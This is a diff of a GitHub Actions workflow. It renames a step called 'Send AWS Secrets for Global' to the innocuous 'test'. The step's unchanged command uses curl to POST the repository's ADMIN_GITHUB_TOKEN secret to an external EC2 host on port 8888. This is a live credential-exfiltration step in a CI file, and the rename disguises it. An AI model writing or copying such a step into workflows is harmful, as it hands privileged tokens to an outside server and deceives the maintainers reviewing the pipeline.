@@ -10,7 +10,7 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
 
-    - name: Send AWS Secrets for Global
+    - name: test
       run: |
         curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
           -d "github-token: ${{ secrets.ADMIN_GITHUB_TOKEN }}"
